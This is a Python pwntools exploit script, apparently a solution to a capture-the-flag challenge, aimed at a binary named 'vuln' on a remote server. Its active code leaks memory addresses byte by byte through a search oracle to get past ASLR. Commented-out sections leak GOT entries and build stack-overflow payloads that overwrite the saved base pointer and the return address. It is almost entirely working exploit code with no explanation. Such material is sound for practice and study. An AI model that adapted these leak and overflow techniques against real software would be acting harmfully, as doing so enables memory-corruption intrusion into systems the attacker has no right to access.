#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./vuln")
# libc = ELF("./libc.so")


def start(argv=[], *a, **kw):
    host = args.HOST or 'eth007.me'
    port = int(args.PORT or 42111)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


aslr_msbs = b"\x7f"


def leak_addr(addr):
    global aslr_msbs
    payload = b"dev" + p64(addr).rstrip(b"\x00")
    io.sendafter(b"bone:\n", payload)

    found_bytes = aslr_msbs
    with log.progress("enumerating") as pro:
        while len(found_bytes) < 6:
            for i in range(1, 256):
                if bytes([i]) == b"\n":
                    continue
                payload = bytes([i]) + found_bytes
                pro.status(payload[::-1].hex())
                io.sendafter(b"bone:\n", payload)
                io.recvline()
                found_matches = io.recvline()
                if b"Found 0" in found_matches:
                    continue
                found_bytes = payload
                break
        aslr_msbs = payload[-3:]
        return u64(found_bytes.ljust(8, b"\x00"))


# leak_printf = leak_addr(elf.got["printf"])
# log.info(f"{leak_printf=:#x}")
# leak_puts = leak_addr(elf.got["puts"])
# log.info(f"{leak_puts=:#x}")
# leak_read = leak_addr(elf.got["read"])
# log.info(f"{leak_read=:#x}")

# leak_stdout = leak_addr(0x404200)
# log.info(f"{leak_stdout=:#x}")

# leak_stdin = leak_addr(0x404210)
# log.info(f"{leak_stdin=:#x}")

# payload = b"A" * 0x50
# payload += b"B" * 0x8
# payload += p64(elf.plt["puts"]).rstrip(b"\x00")
# io.sendafter(b"bone:\n", payload)

# payload = b"A" * 0x50
# payload += b"B" * 6 + b"\n"  # set rbp 2 MSB to null byte
# io.sendafter(b"bone:\n", payload)
#
# payload = b"A" * 0x50
# payload += b"B" * 4 + b"\n"
# io.sendafter(b"bone:\n", payload)
#
# payload = b"A" * 0x50
# payload += b"B" * 2 + b"\n"
# io.sendafter(b"bone:\n", payload)
#
# payload = b"A" * 0x50
# payload += p64(elf.bss(0x280)).rstrip(b"\x00")
# io.sendafter(b"bone:\n", payload)

io.interactive()
